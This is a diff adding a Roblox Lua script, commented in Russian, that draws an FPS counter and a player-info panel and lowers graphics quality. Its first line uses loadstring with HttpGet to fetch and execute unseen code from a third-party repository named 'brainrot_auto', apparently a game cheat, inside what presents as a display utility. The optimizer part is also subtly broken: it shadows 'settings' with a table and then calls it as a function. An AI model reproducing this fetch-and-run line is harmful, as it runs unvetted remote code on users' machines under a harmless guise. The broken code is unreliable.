@@ -1,0 +1,405 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/qwsix909/brainrot_auto/refs/heads/main/special_vlad.lua"))()
+
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
+local UserInputService = game:GetService("UserInputService")
+
+-- Создаем GUI в CoreGui чтобы не пропадал
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "FPSDisplay"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = game:GetService("CoreGui")
+
+-- Основной фрейм
+local frame = Instance.new("Frame")
+frame.Name = "FPSFrame"
+frame.Size = UDim2.new(0, 100, 0, 40)
+frame.AnchorPoint = Vector2.new(1, 0)
+frame.Position = UDim2.new(1, -10, 0, 10)  -- Правый верхний угол с отступом 10 пикселей
+frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+frame.BackgroundTransparency = 0.5
+frame.BorderSizePixel = 0
+
+-- Закругление углов
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0.1, 0)
+corner.Parent = frame
+
+-- Текст FPS
+local label = Instance.new("TextLabel")
+label.Name = "FPSLabel"
+label.Size = UDim2.new(1, 0, 1, 0)
+label.BackgroundTransparency = 1
+label.Text = "FPS: --"
+label.TextColor3 = Color3.fromRGB(255, 255, 255)
+label.TextSize = 18
+label.Font = Enum.Font.GothamSemibold
+label.TextXAlignment = Enum.TextXAlignment.Right
+label.Parent = frame
+
+-- Переменные для подсчета FPS
+local lastUpdate = time()
+local frameCount = 0
+local currentFPS = 0
+
+-- Функция обновления позиции при изменении размера экрана
+local function updatePosition()
+    frame.Position = UDim2.new(1, -10, 0, 10)
+end
+
+-- Основной цикл подсчета FPS
+local function updateFPS()
+    frameCount = frameCount + 1
+    
+    local now = time()
+    local elapsed = now - lastUpdate
+    
+    if elapsed >= 0.5 then  -- Обновляем каждые 0.5 секунды
+        currentFPS = math.floor(frameCount / elapsed + 0.5)
+        label.Text = "FPS: " .. currentFPS
+        
+        -- Меняем цвет в зависимости от FPS
+        if currentFPS < 20 then
+            label.TextColor3 = Color3.fromRGB(255, 50, 50)  -- Красный
+        elseif currentFPS < 40 then
+            label.TextColor3 = Color3.fromRGB(255, 165, 0)  -- Оранжевый
+        else
+            label.TextColor3 = Color3.fromRGB(255, 255, 255)  -- Белый
+        end
+        
+        frameCount = 0
+        lastUpdate = now
+    end
+end
+
+-- Подключаемся к Heartbeat
+RunService.Heartbeat:Connect(updateFPS)
+
+-- Обработка изменения размера экрана
+workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(updatePosition)
+UserInputService.WindowFocusReleased:Connect(updatePosition)
+
+-- Инициализация
+frame.Parent = screenGui
+updatePosition()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+
+-- Настройки
+local settings = {
+    backgroundColor = Color3.fromRGB(30, 30, 30),  -- Темнее серый
+    backgroundTransparency = 0.5,
+    cornerRadius = UDim.new(0.1, 0),
+    padding = 20,
+    avatarSize = 50,
+    textSize = 24,  -- Увеличенный размер текста
+    textGradientSpeed = 1,  -- Скорость анимации градиента
+    textGradientColors = {
+        Color3.fromRGB(0, 0, 0),
+        Color3.fromRGB(255, 255, 255),
+        Color3.fromRGB(0, 0, 0)
+    }
+}
+
+-- Создаём основной GUI в CoreGui, чтобы он не пропадал
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "PlayerInfoGUI"
+screenGui.ResetOnSpawn = false  -- Не пропадает после смерти
+screenGui.Parent = game:GetService("CoreGui")
+
+-- Фрейм для фона
+local frame = Instance.new("Frame")
+frame.Name = "PlayerInfoFrame"
+frame.AnchorPoint = Vector2.new(1, 1)
+frame.Position = UDim2.new(1, -settings.padding, 1, -settings.padding)
+frame.Size = UDim2.new(0, 250, 0, 80)  -- Немного больше для увеличенного текста
+frame.BackgroundColor3 = settings.backgroundColor
+frame.BackgroundTransparency = settings.backgroundTransparency
+frame.BorderSizePixel = 0
+
+-- Закругление углов
+local corner = Instance.new("UICorner")
+corner.CornerRadius = settings.cornerRadius
+corner.Parent = frame
+
+-- Горизонтальный контейнер
+local horizontalLayout = Instance.new("UIListLayout")
+horizontalLayout.FillDirection = Enum.FillDirection.Horizontal
+horizontalLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+horizontalLayout.VerticalAlignment = Enum.VerticalAlignment.Center
+horizontalLayout.Padding = UDim.new(0, 15)
+horizontalLayout.Parent = frame
+
+-- Контейнер для текста (вертикальный)
+local textContainer = Instance.new("Frame")
+textContainer.Name = "TextContainer"
+textContainer.Size = UDim2.new(0, 150, 1, 0)
+textContainer.BackgroundTransparency = 1
+textContainer.Parent = frame
+
+local verticalLayout = Instance.new("UIListLayout")
+verticalLayout.FillDirection = Enum.FillDirection.Vertical
+verticalLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
+verticalLayout.VerticalAlignment = Enum.VerticalAlignment.Center
+verticalLayout.Padding = UDim.new(0, 5)
+verticalLayout.Parent = textContainer
+
+-- Аватарка игрока
+local avatar = Instance.new("ImageLabel")
+avatar.Name = "PlayerAvatar"
+avatar.Size = UDim2.new(0, settings.avatarSize, 0, settings.avatarSize)
+avatar.BackgroundTransparency = 1
+
+-- Закругление аватарки
+local avatarCorner = Instance.new("UICorner")
+avatarCorner.CornerRadius = UDim.new(0.5, 0)
+avatarCorner.Parent = avatar
+
+-- Текст с именем игрока
+local nameLabel = Instance.new("TextLabel")
+nameLabel.Name = "PlayerName"
+nameLabel.Size = UDim2.new(1, 0, 0, settings.textSize)
+nameLabel.BackgroundTransparency = 1
+nameLabel.Text = Player.Name
+nameLabel.TextColor3 = Color3.new(1, 1, 1)
+nameLabel.TextSize = settings.textSize
+nameLabel.Font = Enum.Font.GothamBold
+nameLabel.TextXAlignment = Enum.TextXAlignment.Left
+nameLabel.Parent = textContainer
+
+-- Добавляем аватарку в фрейм
+avatar.Parent = frame
+frame.Parent = screenGui
+
+-- Функция для загрузки аватарки
+local function loadPlayerAvatar()
+    local userId = Player.UserId
+    local thumbType = Enum.ThumbnailType.HeadShot
+    local thumbSize = Enum.ThumbnailSize.Size420x420
+    
+    local content, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
+    
+    avatar.Image = content
+end
+
+-- Анимация градиента текста
+local function startTextGradientAnimation()
+    local step = 0
+    local colorSequence = settings.textGradientColors
+    local sequenceLength = #colorSequence - 1
+    
+    RunService.Heartbeat:Connect(function(deltaTime)
+        step = (step + deltaTime * settings.textGradientSpeed) % sequenceLength
+        local index = math.floor(step)
+        local progress = step - index
+        
+        if index + 2 <= #colorSequence then
+            local color1 = colorSequence[index + 1]
+            local color2 = colorSequence[index + 2]
+            
+            local r = color1.R + (color2.R - color1.R) * progress
+            local g = color1.G + (color2.G - color1.G) * progress
+            local b = color1.B + (color2.B - color1.B) * progress
+            
+            nameLabel.TextColor3 = Color3.new(r, g, b)
+        end
+    end)
+end
+
+-- Функция для обновления позиции при изменении размера экрана
+local function updatePosition()
+    local viewportSize = workspace.CurrentCamera.ViewportSize
+    frame.Position = UDim2.new(1, -settings.padding, 1, -settings.padding)
+end
+
+-- Загружаем аватарку
+loadPlayerAvatar()
+
+-- Запускаем анимацию текста
+startTextGradientAnimation()
+
+-- Подписываемся на изменение размера экрана
+workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(updatePosition)
+UserInputService.WindowFocusReleased:Connect(updatePosition)
+
+-- Первоначальная настройка позиции
+updatePosition()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+local Lighting = game:GetService("Lighting")
+
+-- Настройки оптимизации
+local settings = {
+    blurTextures = true,          -- Размытие текстур
+    textureQuality = 0.5,         -- Качество текстур (0-1)
+    disableShadows = true,        -- Отключить тени
+    lowerGraphicsQuality = true,  -- Понизить качество графики
+    fpsCap = 60                   -- Ограничение FPS (0 для отключения)
+}
+
+-- Функция для размытия текстур
+local function blurTextures()
+    if not settings.blurTextures then return end
+    
+    for _, obj in pairs(workspace:GetDescendants()) do
+        if obj:IsA("BasePart") then
+            -- Размытие текстур для частей
+            obj.Material = Enum.Material.Plastic
+            obj.Reflectance = 0
+            
+            if obj:FindFirstChildOfClass("Texture") then
+                local texture = obj:FindFirstChildOfClass("Texture")
+                texture.StudsPerTileU = texture.StudsPerTileU * 2
+                texture.StudsPerTileV = texture.StudsPerTileV * 2
+            end
+        elseif obj:IsA("Decal") then
+            -- Размытие декалей
+            obj.Transparency = 0.1
+        end
+    end
+end
+
+-- Функция для понижения качества графики
+local function lowerGraphicsQuality()
+    if not settings.lowerGraphicsQuality then return end
+    
+    -- Настройки освещения
+    Lighting.GlobalShadows = false
+    Lighting.ShadowSoftness = 0
+    Lighting.Brightness = 1.5
+    
+    -- Настройки рендеринга
+    settings().Rendering.QualityLevel = 1
+    
+    -- Отключение детальных эффектов
+    for _, effect in pairs(Lighting:GetChildren()) do
+        if effect:IsA("BlurEffect") or effect:IsA("SunRaysEffect") or effect:IsA("ColorCorrectionEffect") then
+            effect.Enabled = false
+        end
+    end
+end
+
+-- Функция для ограничения FPS
+local function capFPS()
+    if settings.fpsCap <= 0 then return end
+    
+    local targetFrameTime = 1 / settings.fpsCap
+    local lastTick = tick()
+    
+    RunService.Heartbeat:Connect(function()
+        local now = tick()
+        local elapsed = now - lastTick
+        
+        if elapsed < targetFrameTime then
+            wait(targetFrameTime - elapsed)
+        end
+        
+        lastTick = tick()
+    end)
+end
+
+-- Функция для оптимизации персонажей игроков
+local function optimizePlayerCharacters()
+    Players.PlayerAdded:Connect(function(player)
+        player.CharacterAdded:Connect(function(character)
+            for _, child in pairs(character:GetDescendants()) do
+                if child:IsA("BasePart") then
+                    child.Material = Enum.Material.Plastic
+                    child.Reflectance = 0
+                elseif child:IsA("ParticleEmitter") or child:IsA("Trail") then
+                    child.Enabled = false
+                end
+            end
+        end)
+    end)
+end
+
+-- Функция для уменьшения качества текстур
+local function reduceTextureQuality()
+    if settings.textureQuality >= 1 then return end
+    
+    for _, obj in pairs(workspace:GetDescendants()) do
+        if obj:IsA("Texture") then
+            obj.StudsPerTileU = obj.StudsPerTileU / settings.textureQuality
+            obj.StudsPerTileV = obj.StudsPerTileV / settings.textureQuality
+        end
+    end
+end
+
+-- Основная функция оптимизации
+local function optimizeGame()
+    blurTextures()
+    lowerGraphicsQuality()
+    reduceTextureQuality()
+    optimizePlayerCharacters()
+    
+    if settings.disableShadows then
+        Lighting.GlobalShadows = false
+    end
+    
+    if settings.fpsCap > 0 then
+        capFPS()
+    end
+    
+    print("Оптимизация применена:")
+    print("- Размытие текстур:", settings.blurTextures)
+    print("- Качество текстур:", settings.textureQuality)
+    print("- Тени отключены:", settings.disableShadows)
+    print("- Графика понижена:", settings.lowerGraphicsQuality)
+    print("- Ограничение FPS:", settings.fpsCap > 0 and settings.fpsCap or "нет")
+end
+
+-- Запускаем оптимизацию
+optimizeGame()
+
+-- Применяем оптимизацию для новых объектов
+workspace.DescendantAdded:Connect(function(descendant)
+    if settings.blurTextures and descendant:IsA("BasePart") then
+        descendant.Material = Enum.Material.Plastic
+        descendant.Reflectance = 0
+    end
+    
+    if settings.textureQuality < 1 and descendant:IsA("Texture") then
+        descendant.StudsPerTileU = descendant.StudsPerTileU / settings.textureQuality
+        descendant.StudsPerTileV = descendant.StudsPerTileV / settings.textureQuality
+    end
+end)
